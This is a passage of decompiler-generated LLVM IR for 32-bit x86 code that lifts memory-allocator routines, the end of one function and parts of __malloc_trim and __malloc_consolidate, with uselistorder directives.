dec_label_pc_804aa03:                             ; preds = %dec_label_pc_804a9f2, %dec_label_pc_804a9e8, %dec_label_pc_804a993, %dec_label_pc_804a64f, %dec_label_pc_804a601, %dec_label_pc_804a388, %dec_label_pc_804a9f6
  store i32 %v2_804a2bf, i32* @eax, align 4
  store i32 %v2_804a2bf, i32* %stack_var_-92, align 4
  %v2_804aa0c = call i32 @__pthread_return_void(i32 %v2_804a2bf, i32 1)
  store i32 %v2_804aa0c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804aa14

dec_label_pc_804aa14:                             ; preds = %dec_label_pc_804a2dd, %dec_label_pc_804aa03
  %v0_804aa17 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804aa17, i32* %eax.global-to-local, align 4
  %v2_804aa19 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804aa19, i32* @ebx, align 4
  store i32 %v0_804a2ac, i32* @esi, align 4
  store i32 %v0_804a2ab, i32* @edi, align 4
  store i32 %v0_804a2aa, i32* @ebp, align 4
  ret i32 %v0_804aa17

; uselistorder directives
  uselistorder i32 %v0_804a9da, { 1, 0 }
  uselistorder i32 %v0_804a9ba, { 1, 0, 2 }
  uselistorder i32 %v2_804a957, { 1, 0, 2 }
  uselistorder i32 %v0_804a945, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804a8dc, { 1, 0 }
  uselistorder i32 %v2_804a8ca, { 1, 0 }
  uselistorder i32 %v1_804a881, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_804a86b, { 1, 0, 2 }
  uselistorder i32 %v2_804a85f, { 1, 2, 0 }
  uselistorder i32 %v2_804a85a, { 1, 0, 2 }
  uselistorder i32 %v1_804a84a, { 2, 1, 0 }
  uselistorder i8 %v0_804a818, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_804a7fb, { 1, 0, 2 }
  uselistorder i32 %v0_804a8af91, { 2, 0, 1 }
  uselistorder i32 %v0_804a8bd92, { 3, 4, 1, 2, 5, 0, 7, 6 }
  uselistorder i32 %v1_804a7f5, { 2, 1, 0 }
  uselistorder i32 %v8_804a7cb, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804a7c8, { 1, 0 }
  uselistorder i32 %v0_804a7a7, { 1, 0 }
  uselistorder i32 %v2_804a778, { 2, 1, 0, 3 }
  uselistorder i32 %v1_804a770, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_804a75d, { 1, 0 }
  uselistorder i32 %v1_804a754, { 5, 0, 1, 2, 3, 4, 6, 7 }
  uselistorder i32 %v0_804a741, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_804a725, { 1, 0, 2 }
  uselistorder i32 %v2_804a711, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_804a6da, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804a6ce, { 2, 1, 0 }
  uselistorder i32 %v8_804a6bd, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v2_804a6a4, { 1, 0, 2 }
  uselistorder i32 %v0_804a640, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_804a613, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804a609, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_804a5fb, { 1, 0 }
  uselistorder i32 %v1_804a592, { 1, 0 }
  uselistorder i32 %v3_804a586, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804a596, { 1, 0 }
  uselistorder i32 %v2_804a580, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_804a57d12, { 1, 0 }
  uselistorder i32 %v2_804a572, { 1, 0 }
  uselistorder i32 %v1_804a556, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804a552, { 2, 1, 0 }
  uselistorder i32 %v1_804a54e, { 1, 0 }
  uselistorder i32 %v1_804a542, { 2, 1, 0 }
  uselistorder i32 %v2_804a538, { 1, 0 }
  uselistorder i32 %v1_804a535, { 1, 2, 0 }
  uselistorder i32 %v4_804a4d3, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_804a51e, { 1, 0 }
  uselistorder i32 %v0_804a4ec, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804a4bf, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804a48c, { 1, 2, 0 }
  uselistorder i32 %v2_804a470, { 1, 0 }
  uselistorder i32 %v1_804a466, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804a461.lcssa, { 1, 0 }
  uselistorder i32 %v3_804a451, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804a448, { 1, 0, 2 }
  uselistorder i32 %v2_804a424, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804a40c, { 2, 1, 0 }
  uselistorder i32 %v0_804a3f8, { 2, 0, 3, 1 }
  uselistorder i32 %v3_804a3be, { 1, 0, 2 }
  uselistorder i32 %v0_804a48c111, { 0, 3, 1, 2 }
  uselistorder i32 %v3_804a36b, { 1, 0, 2 }
  uselistorder i32 %v2_804a35d, { 2, 1, 0 }
  uselistorder i32 %v2_804a338, { 2, 1, 0 }
  uselistorder i8 %v0_804a306, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_804a69e, { 13, 31, 11, 2, 29, 12, 3, 22, 21, 10, 9, 4, 24, 23, 20, 18, 19, 5, 25, 26, 6, 27, 28, 15, 7, 16, 17, 8, 30, 14, 0, 32, 34, 33, 1, 35 }
  uselistorder i32 %v1_804a2ef, { 0, 2, 1 }
  uselistorder i32 %v0_804a2d8, { 1, 0 }
  uselistorder i32 %v2_804a2bf, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-92, { 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 1, 14, 15 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %ebx.global-to-local, { 21, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 1, 11, 12, 14, 15, 16, 17, 0, 18, 19, 20, 22, 23, 24 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 55, 50, 51, 54, 53, 52, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 69, 70, 0, 71, 72, 73 }
  uselistorder i32 1048576, { 1, 2, 0 }
  uselistorder i8* @global_var_8054960.53, { 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 134563380, { 2, 3, 1, 0 }
  uselistorder i32* @global_var_8054640.41, { 1, 2, 3, 0 }
  uselistorder i32 ()* @__malloc_largebin_index, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_805462c.38 to i32), i32 12), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_805462c.38 to i32), { 2, 3, 4, 0, 5, 1, 6 }
  uselistorder label %dec_label_pc_804aa14, { 1, 0 }
  uselistorder label %dec_label_pc_804aa03, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_804a9f6, { 1, 2, 0 }
  uselistorder label %dec_label_pc_804a9f2, { 1, 0 }
  uselistorder label %dec_label_pc_804a9e8, { 1, 0 }
  uselistorder label %dec_label_pc_804a993, { 1, 0 }
  uselistorder label %dec_label_pc_804a96a, { 1, 0 }
  uselistorder label %dec_label_pc_804a957, { 1, 0 }
  uselistorder label %dec_label_pc_804a945, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804a8d7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a8d2, { 1, 0 }
  uselistorder label %dec_label_pc_804a8b6, { 1, 0 }
  uselistorder label %dec_label_pc_804a85f, { 1, 0 }
  uselistorder label %dec_label_pc_804a848, { 1, 0 }
  uselistorder label %dec_label_pc_804a831, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a7b4, { 1, 0 }
  uselistorder label %dec_label_pc_804a7a7, { 1, 0 }
  uselistorder label %dec_label_pc_804a768, { 1, 0 }
  uselistorder label %dec_label_pc_804a741, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804a725, { 1, 0 }
  uselistorder label %dec_label_pc_804a70c, { 1, 0 }
  uselistorder label %dec_label_pc_804a6ee, { 1, 0 }
  uselistorder label %dec_label_pc_804a609, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804a601, { 1, 0 }
  uselistorder label %dec_label_pc_804a5ea, { 1, 0 }
  uselistorder label %dec_label_pc_804a57d, { 1, 0 }
  uselistorder label %dec_label_pc_804a582.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804a556, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804a4dd, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_804a464, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_804a44d, { 1, 0 }
  uselistorder label %dec_label_pc_804a3bb, { 1, 0 }
  uselistorder label %dec_label_pc_804a48c.preheader, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804a388, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804a306, { 1, 0 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_804aa27 = load i32, i32* @edx, align 4
  store i32 %v0_804aa27, i32* %ebp.global-to-local, align 4
  %v1_804aa29 = add i32 %v0_804aa27, 860
  %v2_804aa29 = inttoptr i32 %v1_804aa29 to i32*
  %v3_804aa29 = load i32, i32* %v2_804aa29, align 4
  store i32 %v3_804aa29, i32* @ecx, align 4
  %v1_804aa2f = add i32 %v0_804aa27, 44
  %v2_804aa2f = inttoptr i32 %v1_804aa2f to i32*
  %v3_804aa2f = load i32, i32* %v2_804aa2f, align 4
  %v1_804aa32 = add i32 %v3_804aa2f, 4
  %v2_804aa32 = inttoptr i32 %v1_804aa32 to i32*
  %v3_804aa32 = load i32, i32* %v2_804aa32, align 4
  %v1_804aa35 = and i32 %v3_804aa32, -4
  store i32 %v1_804aa35, i32* @esi, align 4
  %v1_804aa3a = load i32, i32* @eax, align 4
  %v2_804aa3a = add i32 %v3_804aa29, -17
  %v2_804aa3c = add i32 %v2_804aa3a, %v1_804aa35
  %v3_804aa3c = sub i32 %v2_804aa3c, %v1_804aa3a
  %div = udiv i32 %v3_804aa3c, %v3_804aa29
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp10 = urem i32 %v3_804aa3c, %v3_804aa29
  store i32 %tmp10, i32* @edx, align 4
  %v1_804aa44 = add i32 %div, -1
  %v4_804aa47 = mul i32 %v1_804aa44, %v3_804aa29
  store i32 %v4_804aa47, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_804aa47, 1
  br i1 %tmp11, label %dec_label_pc_804aaa3, label %dec_label_pc_804aa4e

dec_label_pc_804aa4e:                             ; preds = %entry
  %v1_804aa53 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804aa53, i32* %edi.global-to-local, align 4
  %v0_804aa5a = load i32, i32* @esi, align 4
  store i32 %v0_804aa5a, i32* %eax.global-to-local, align 4
  %v1_804aa5c = load i32, i32* %ebp.global-to-local, align 4
  %v2_804aa5c = add i32 %v1_804aa5c, 44
  %v3_804aa5c = inttoptr i32 %v2_804aa5c to i32*
  %v4_804aa5c = load i32, i32* %v3_804aa5c, align 4
  %v5_804aa5c = add i32 %v4_804aa5c, %v0_804aa5a
  store i32 %v5_804aa5c, i32* %eax.global-to-local, align 4
  %v12_804aa62 = icmp eq i32 %v1_804aa53, %v5_804aa5c
  %v1_804aa64 = icmp eq i1 %v12_804aa62, false
  br i1 %v1_804aa64, label %dec_label_pc_804aaa3, label %dec_label_pc_804aa66

dec_label_pc_804aa66:                             ; preds = %dec_label_pc_804aa4e
  %v1_804aa69 = sub i32 0, %v4_804aa47
  store i32 %v1_804aa69, i32* @ebx, align 4
  %v1_804aa6c = call i32 @__GI_sbrk(i32 %v1_804aa69)
  store i32 %v1_804aa6c, i32* %eax.global-to-local, align 4
  %v1_804aa78 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_804aa78, i32* %eax.global-to-local, align 4
  %v10_804aa80 = icmp eq i32 %v1_804aa78, -1
  br i1 %v10_804aa80, label %dec_label_pc_804aaa3, label %dec_label_pc_804aa85

dec_label_pc_804aa85:                             ; preds = %dec_label_pc_804aa66
  %v0_804aa85 = load i32, i32* %edi.global-to-local, align 4
  %v2_804aa87 = sub i32 %v0_804aa85, %v1_804aa78
  %v12_804aa87 = icmp eq i32 %v2_804aa87, 0
  store i32 %v2_804aa87, i32* @ecx, align 4
  br i1 %v12_804aa87, label %dec_label_pc_804aaa3, label %dec_label_pc_804aa8b

dec_label_pc_804aa8b:                             ; preds = %dec_label_pc_804aa85
  %v0_804aa8b = load i32, i32* %ebp.global-to-local, align 4
  %v1_804aa8b = add i32 %v0_804aa8b, 44
  %v2_804aa8b = inttoptr i32 %v1_804aa8b to i32*
  %v3_804aa8b = load i32, i32* %v2_804aa8b, align 4
  store i32 %v3_804aa8b, i32* %eax.global-to-local, align 4
  %v1_804aa8e = add i32 %v0_804aa8b, 872
  %v2_804aa8e = inttoptr i32 %v1_804aa8e to i32*
  %v3_804aa8e = load i32, i32* %v2_804aa8e, align 4
  %v5_804aa8e = sub i32 %v3_804aa8e, %v2_804aa87
  store i32 %v5_804aa8e, i32* %v2_804aa8e, align 4
  %v0_804aa94 = load i32, i32* @esi, align 4
  %v1_804aa94 = load i32, i32* @ecx, align 4
  %v2_804aa94 = sub i32 %v0_804aa94, %v1_804aa94
  %v1_804aa96 = or i32 %v2_804aa94, 1
  %v1_804aa99 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aa99 = add i32 %v1_804aa99, 4
  %v3_804aa99 = inttoptr i32 %v2_804aa99 to i32*
  store i32 %v1_804aa96, i32* %v3_804aa99, align 4
  br label %dec_label_pc_804aaa5

dec_label_pc_804aaa3:                             ; preds = %dec_label_pc_804aa85, %dec_label_pc_804aa66, %dec_label_pc_804aa4e, %entry
  br label %dec_label_pc_804aaa5

dec_label_pc_804aaa5:                             ; preds = %dec_label_pc_804aa8b, %dec_label_pc_804aaa3
  %storemerge = phi i32 [ 1, %dec_label_pc_804aa8b ], [ 0, %dec_label_pc_804aaa3 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804aa78, { 1, 0, 2 }
  uselistorder i32 %v4_804aa47, { 1, 2, 0 }
  uselistorder i32 %v3_804aa29, { 0, 3, 2, 1, 4 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_804aaa5, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_804aaae = load i32, i32* @edi, align 4
  %v0_804aaaf = load i32, i32* @esi, align 4
  %v0_804aab0 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_804aab8 = load i32, i32* %arg1, align 4
  store i32 %v2_804aab8, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_804aabf = icmp eq i32 %v2_804aab8, 0
  br i1 %v1_804aabf, label %dec_label_pc_804abe8.preheader, label %dec_label_pc_804aac7

dec_label_pc_804abe8.preheader:                   ; preds = %entry
  %v3_804abdd = add i32 %tmp11, 44
  br label %dec_label_pc_804abd9

dec_label_pc_804aac7:                             ; preds = %entry
  %v1_804aacb = and i32 %v2_804aab8, -3
  store i32 %v1_804aacb, i32* %arg1, align 4
  %v1_804aad0 = add i32 %tmp11, 52
  store i32 %tmp11, i32* @edx, align 4
  %v1_804aadb = add i32 %tmp11, 4
  store i32 %v1_804aadb, i32* %eax.global-to-local, align 4
  %v2_804aae6 = load i32, i32* %arg1, align 4
  %v2_804aaec = udiv i32 %v2_804aae6, 8
  %v2_804aaef = mul nuw i32 %v2_804aaec, 4
  %v3_804aaef = add i32 %tmp11, -4
  %v4_804aaef = add i32 %v3_804aaef, %v2_804aaef
  store i32 %v4_804aaef, i32* %eax.global-to-local, align 4
  %v2_804abb6 = add i32 %tmp11, 44
  %v3_804abb6 = inttoptr i32 %v2_804abb6 to i32*
  %v1_804ab89 = add i32 %tmp11, 60
  %v2_804ab89 = inttoptr i32 %v1_804ab89 to i32*
  br label %dec_label_pc_804aaf7

dec_label_pc_804aaf7:                             ; preds = %dec_label_pc_804abcf, %dec_label_pc_804aac7
  %v0_804ab05 = phi i32 [ %v1_804aadb, %dec_label_pc_804aac7 ], [ %v4_804abcf, %dec_label_pc_804abcf ]
  store i32 %v0_804ab05, i32* %eax.global-to-local, align 4
  %v1_804aafb = inttoptr i32 %v0_804ab05 to i32*
  %v2_804aafb = load i32, i32* %v1_804aafb, align 4
  store i32 %v2_804aafb, i32* @ecx, align 4
  %v1_804aafd = icmp eq i32 %v2_804aafb, 0
  br i1 %v1_804aafd, label %dec_label_pc_804abc5, label %dec_label_pc_804ab05

dec_label_pc_804ab05:                             ; preds = %dec_label_pc_804aaf7
  store i32 0, i32* %v1_804aafb, align 4
  %v0_804ab0b.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804ab0b

dec_label_pc_804ab0b:                             ; preds = %dec_label_pc_804abb9, %dec_label_pc_804ab05
  %v0_804ab28 = phi i32 [ %v3_804ab0b, %dec_label_pc_804abb9 ], [ %v0_804ab0b.pre, %dec_label_pc_804ab05 ]
  %v1_804ab0b = add i32 %v0_804ab28, 8
  %v2_804ab0b = inttoptr i32 %v1_804ab0b to i32*
  %v3_804ab0b = load i32, i32* %v2_804ab0b, align 4
  store i32 %v3_804ab0b, i32* %edx.global-to-local, align 4
  %v1_804ab12 = add i32 %v0_804ab28, 4
  %v2_804ab12 = inttoptr i32 %v1_804ab12 to i32*
  %v3_804ab12 = load i32, i32* %v2_804ab12, align 4
  store i32 %v3_804ab12, i32* %eax.global-to-local, align 4
  %v1_804ab17 = and i32 %v3_804ab12, -2
  store i32 %v1_804ab17, i32* @edi, align 4
  %v2_804ab1a = urem i32 %v3_804ab12, 2
  %v3_804ab1a = icmp eq i32 %v2_804ab1a, 0
  %v2_804ab1c = add i32 %v1_804ab17, %v0_804ab28
  store i32 %v2_804ab1c, i32* @ebx, align 4
  %v1_804ab1f = add i32 %v2_804ab1c, 4
  %v2_804ab1f = inttoptr i32 %v1_804ab1f to i32*
  %v3_804ab1f = load i32, i32* %v2_804ab1f, align 4
  store i32 %v3_804ab1f, i32* %edx.global-to-local, align 4
  %v1_804ab26 = icmp eq i1 %v3_804ab1a, false
  br i1 %v1_804ab26, label %dec_label_pc_804ab48, label %dec_label_pc_804ab28

dec_label_pc_804ab28:                             ; preds = %dec_label_pc_804ab0b
  %v1_804ab28 = inttoptr i32 %v0_804ab28 to i32*
  %v2_804ab28 = load i32, i32* %v1_804ab28, align 4
  store i32 %v2_804ab28, i32* %ebp.global-to-local, align 4
  %v2_804ab2c = sub i32 %v0_804ab28, %v2_804ab28
  store i32 %v2_804ab2c, i32* %eax.global-to-local, align 4
  %v1_804ab2e = add i32 %v2_804ab2c, 8
  %v2_804ab2e = inttoptr i32 %v1_804ab2e to i32*
  %v3_804ab2e = load i32, i32* %v2_804ab2e, align 4
  store i32 %v3_804ab2e, i32* @esi, align 4
  %v1_804ab31 = add i32 %v2_804ab2c, 12
  %v2_804ab31 = inttoptr i32 %v1_804ab31 to i32*
  %v3_804ab31 = load i32, i32* %v2_804ab31, align 4
  store i32 %v3_804ab31, i32* %edx.global-to-local, align 4
  %v1_804ab34 = add i32 %v3_804ab2e, 12
  %v2_804ab34 = inttoptr i32 %v1_804ab34 to i32*
  %v3_804ab34 = load i32, i32* %v2_804ab34, align 4
  store i32 %v3_804ab34, i32* @ecx, align 4
  %v12_804ab37 = icmp eq i32 %v3_804ab34, %v2_804ab2c
  %v1_804ab39 = icmp eq i1 %v12_804ab37, false
  br i1 %v1_804ab39, label %dec_label_pc_804ab78, label %dec_label_pc_804ab3b

dec_label_pc_804ab3b:                             ; preds = %dec_label_pc_804ab28
  %v1_804ab3b = add i32 %v3_804ab31, 8
  %v2_804ab3b = inttoptr i32 %v1_804ab3b to i32*
  %v3_804ab3b = load i32, i32* %v2_804ab3b, align 4
  %v15_804ab3b = icmp eq i32 %v3_804ab3b, %v3_804ab34
  %v1_804ab3e = icmp eq i1 %v15_804ab3b, false
  br i1 %v1_804ab3e, label %dec_label_pc_804ab78, label %dec_label_pc_804ab40

dec_label_pc_804ab40:                             ; preds = %dec_label_pc_804ab3b
  %v2_804ab40 = add i32 %v2_804ab28, %v1_804ab17
  store i32 %v2_804ab40, i32* @edi, align 4
  store i32 %v3_804ab31, i32* %v2_804ab34, align 4
  %v0_804ab45 = load i32, i32* @esi, align 4
  %v1_804ab45 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ab45 = add i32 %v1_804ab45, 8
  %v3_804ab45 = inttoptr i32 %v2_804ab45 to i32*
  store i32 %v0_804ab45, i32* %v3_804ab45, align 4
  %v0_804ab53.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ab48

dec_label_pc_804ab48:                             ; preds = %dec_label_pc_804ab0b, %dec_label_pc_804ab40
  %v1_804ab5c = phi i32 [ %v2_804ab1c, %dec_label_pc_804ab0b ], [ %v0_804ab53.pre, %dec_label_pc_804ab40 ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_804ab50 = and i32 %v3_804ab1f, -4
  store i32 %v1_804ab50, i32* %ebp.global-to-local, align 4
  %v4_804ab53 = load i32, i32* %v3_804abb6, align 4
  %v15_804ab53 = icmp eq i32 %v1_804ab5c, %v4_804ab53
  br i1 %v15_804ab53, label %dec_label_pc_804aba9, label %dec_label_pc_804ab58

dec_label_pc_804ab58:                             ; preds = %dec_label_pc_804ab48
  %v2_804ab58 = add i32 %v1_804ab5c, 4
  %v3_804ab58 = add i32 %v2_804ab58, %v1_804ab50
  %v4_804ab58 = inttoptr i32 %v3_804ab58 to i32*
  %v5_804ab58 = load i32, i32* %v4_804ab58, align 4
  store i32 %v5_804ab58, i32* %eax.global-to-local, align 4
  %v3_804ab5c = inttoptr i32 %v2_804ab58 to i32*
  store i32 %v1_804ab50, i32* %v3_804ab5c, align 4
  %v0_804ab5f = load i32, i32* %eax.global-to-local, align 4
  %v1_804ab5f = urem i32 %v0_804ab5f, 2
  %v2_804ab5f = icmp eq i32 %v1_804ab5f, 0
  store i32 %v1_804ab5f, i32* %eax.global-to-local, align 4
  %v1_804ab64 = icmp eq i1 %v2_804ab5f, false
  br i1 %v1_804ab64, label %dec_label_pc_804ab85, label %dec_label_pc_804ab66

dec_label_pc_804ab66:                             ; preds = %dec_label_pc_804ab58
  %v0_804ab66 = load i32, i32* @ebx, align 4
  %v1_804ab66 = add i32 %v0_804ab66, 8
  %v2_804ab66 = inttoptr i32 %v1_804ab66 to i32*
  %v3_804ab66 = load i32, i32* %v2_804ab66, align 4
  store i32 %v3_804ab66, i32* @edx, align 4
  %v1_804ab69 = add i32 %v0_804ab66, 12
  %v2_804ab69 = inttoptr i32 %v1_804ab69 to i32*
  %v3_804ab69 = load i32, i32* %v2_804ab69, align 4
  store i32 %v3_804ab69, i32* %eax.global-to-local, align 4
  %v1_804ab6c = add i32 %v3_804ab66, 12
  %v2_804ab6c = inttoptr i32 %v1_804ab6c to i32*
  %v3_804ab6c = load i32, i32* %v2_804ab6c, align 4
  store i32 %v3_804ab6c, i32* @esi, align 4
  %v12_804ab6f = icmp eq i32 %v3_804ab6c, %v0_804ab66
  %v1_804ab71 = icmp eq i1 %v12_804ab6f, false
  br i1 %v1_804ab71, label %dec_label_pc_804ab78, label %dec_label_pc_804ab73

dec_label_pc_804ab73:                             ; preds = %dec_label_pc_804ab66
  %v1_804ab73 = add i32 %v3_804ab69, 8
  %v2_804ab73 = inttoptr i32 %v1_804ab73 to i32*
  %v3_804ab73 = load i32, i32* %v2_804ab73, align 4
  %v15_804ab73 = icmp eq i32 %v3_804ab73, %v3_804ab6c
  br i1 %v15_804ab73, label %dec_label_pc_804ab7d, label %dec_label_pc_804ab78

dec_label_pc_804ab78:                             ; preds = %dec_label_pc_804ab73, %dec_label_pc_804ab66, %dec_label_pc_804ab3b, %dec_label_pc_804ab28
  %v0_804ab78 = call i32 @abort()
  store i32 %v0_804ab78, i32* %eax.global-to-local, align 4
  %v1_804ab7f.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804ab7d

dec_label_pc_804ab7d:                             ; preds = %dec_label_pc_804ab73, %dec_label_pc_804ab78
  %v1_804ab7f = phi i32 [ %v3_804ab66, %dec_label_pc_804ab73 ], [ %v1_804ab7f.pre, %dec_label_pc_804ab78 ]
  %v0_804ab7f = phi i32 [ %v3_804ab69, %dec_label_pc_804ab73 ], [ %v0_804ab78, %dec_label_pc_804ab78 ]
  %v0_804ab7d = load i32, i32* @edi, align 4
  %v1_804ab7d = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ab7d = add i32 %v1_804ab7d, %v0_804ab7d
  store i32 %v2_804ab7d, i32* @edi, align 4
  %v2_804ab7f = add i32 %v1_804ab7f, 12
  %v3_804ab7f = inttoptr i32 %v2_804ab7f to i32*
  store i32 %v0_804ab7f, i32* %v3_804ab7f, align 4
  %v0_804ab82 = load i32, i32* @edx, align 4
  %v1_804ab82 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ab82 = add i32 %v1_804ab82, 8
  %v3_804ab82 = inttoptr i32 %v2_804ab82 to i32*
  store i32 %v0_804ab82, i32* %v3_804ab82, align 4
  br label %dec_label_pc_804ab85

dec_label_pc_804ab85:                             ; preds = %dec_label_pc_804ab58, %dec_label_pc_804ab7d
  store i32 %v1_804aad0, i32* %eax.global-to-local, align 4
  %v3_804ab89 = load i32, i32* %v2_804ab89, align 4
  store i32 %v3_804ab89, i32* @edx, align 4
  %v0_804ab8c = load i32, i32* @ecx, align 4
  store i32 %v0_804ab8c, i32* %v2_804ab89, align 4
  %v0_804ab8f = load i32, i32* @edi, align 4
  %v1_804ab91 = or i32 %v0_804ab8f, 1
  store i32 %v1_804ab91, i32* %eax.global-to-local, align 4
  %v0_804ab94 = load i32, i32* @ecx, align 4
  %v1_804ab94 = load i32, i32* @edx, align 4
  %v2_804ab94 = add i32 %v1_804ab94, 12
  %v3_804ab94 = inttoptr i32 %v2_804ab94 to i32*
  store i32 %v0_804ab94, i32* %v3_804ab94, align 4
  %v0_804ab97 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ab97 = load i32, i32* @ecx, align 4
  %v2_804ab97 = add i32 %v1_804ab97, 4
  %v3_804ab97 = inttoptr i32 %v2_804ab97 to i32*
  store i32 %v0_804ab97, i32* %v3_804ab97, align 4
  store i32 %v1_804aad0, i32* %eax.global-to-local, align 4
  %v0_804ab9e = load i32, i32* @edx, align 4
  %v1_804ab9e = load i32, i32* @ecx, align 4
  %v2_804ab9e = add i32 %v1_804ab9e, 8
  %v3_804ab9e = inttoptr i32 %v2_804ab9e to i32*
  store i32 %v0_804ab9e, i32* %v3_804ab9e, align 4
  %v0_804aba1 = load i32, i32* %eax.global-to-local, align 4
  %v1_804aba1 = load i32, i32* @ecx, align 4
  %v2_804aba1 = add i32 %v1_804aba1, 12
  %v3_804aba1 = inttoptr i32 %v2_804aba1 to i32*
  store i32 %v0_804aba1, i32* %v3_804aba1, align 4
  %v0_804aba4 = load i32, i32* @edi, align 4
  %v1_804aba4 = load i32, i32* @ecx, align 4
  %v3_804aba4 = add i32 %v1_804aba4, %v0_804aba4
  %v4_804aba4 = inttoptr i32 %v3_804aba4 to i32*
  store i32 %v0_804aba4, i32* %v4_804aba4, align 4
  br label %dec_label_pc_804abb9

dec_label_pc_804aba9:                             ; preds = %dec_label_pc_804ab48
  %v0_804aba9 = load i32, i32* @edi, align 4
  %v2_804aba9 = add i32 %v0_804aba9, %v1_804ab50
  %v1_804abac = or i32 %v2_804aba9, 1
  store i32 %v1_804abac, i32* %eax.global-to-local, align 4
  %v1_804abaf = load i32, i32* @ecx, align 4
  %v2_804abaf = add i32 %v1_804abaf, 4
  %v3_804abaf = inttoptr i32 %v2_804abaf to i32*
  store i32 %v1_804abac, i32* %v3_804abaf, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_804abb6 = load i32, i32* @ecx, align 4
  store i32 %v0_804abb6, i32* %v3_804abb6, align 4
  br label %dec_label_pc_804abb9

dec_label_pc_804abb9:                             ; preds = %dec_label_pc_804ab85, %dec_label_pc_804aba9
  store i32 %v3_804ab0b, i32* @ecx, align 4
  %v1_804abbd = icmp eq i32 %v3_804ab0b, 0
  %v1_804abbf = icmp eq i1 %v1_804abbd, false
  br i1 %v1_804abbf, label %dec_label_pc_804ab0b, label %dec_label_pc_804abc5

dec_label_pc_804abc5:                             ; preds = %dec_label_pc_804abb9, %dec_label_pc_804aaf7
  store i32 %v4_804aaef, i32* @ecx, align 4
  %v15_804abc9 = icmp eq i32 %v0_804ab05, %v4_804aaef
